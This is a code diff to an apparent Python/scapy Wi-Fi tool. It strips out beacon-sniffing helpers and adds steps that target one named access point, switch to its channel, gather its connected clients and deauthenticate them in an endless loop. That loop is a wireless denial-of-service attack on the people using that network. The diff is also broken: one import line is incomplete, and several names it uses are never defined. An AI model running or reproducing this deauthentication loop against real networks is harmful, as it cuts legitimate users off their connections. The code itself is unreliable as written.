@@ -19,67 +19,27 @@ import time
 import pandas
 
 from get_ap import get_ap
-
-
-def print_all():
-    """
-    @ https://thepacketgeek.com/scapy/sniffing-custom-actions/part-2/
-    """
-    while True:
-        os.system("clear")
-        print(networks)
-        time.sleep(0.5)
-
-
-def change_channel():
-    """
-    @ https://thepacketgeek.com/scapy/sniffing-custom-actions/part-2/
-    Note: Channels 12 and 13 are allowed in low-power mode, while channel 14 is banned and only allowed in Japan.
-    Thus we don't use channel 14.
-    """
-    ch = 1
-    while True:
-        os.system(f"iwconfig {interface} channel {ch}")
-        # switch channel from 1 to 14 each 0.5s
-        ch = (ch % 13) + 1
-        time.sleep(0.5)
-
-
-def callback(packet):
-    if packet.haslayer(Dot11Beacon):
-        # extract the MAC address of the network
-        bssid = packet[Dot11].addr2
-        packet[Dot11]
-        # get the name of it
-        ssid = packet[Dot11Elt].info.decode()
-        try:
-            dbm_signal = packet.dBm_AntSignal
-        except:
-            dbm_signal = "N/A"
-        # extract network stats
-        stats = packet[Dot11Beacon].network_stats()
-        # get the channel of the AP
-        channel = stats.get("channel")
-        # get the crypto
-        crypto = stats.get("crypto")
-        guessed_payload = packet[Dot11].guess_payload_class(packet)
-        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
+from get_clients_on_ap
 
 
 INTERFACE = "wlan0mon"
+TIMEOUT = 10
 
-AP_info = get_ap(timeout=10, interface=INTERFACE, specific_ap="Sams 9")
+AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE, specific_ap="Sams 9")
 
-
-print(AP_info)
+print(AP_info.columns)
 
 channel = AP_info.Channel
-#BSSID = AP_info.BSSID
+BSSID = AP_info.index
 
-#change channel to be on APs channel
-#os.system(f"iwconfig {INTERFACE} channel {channel}")
-#clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
+# change channel to be on APs channel
+os.system(f"iwconfig {INTERFACE} channel {channel}")
+clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
 
+# Deauth clients
+while True:
+    print("Deauthenticating clients...")
+    deauth_clients(clients, AP, reason)
 
 
 
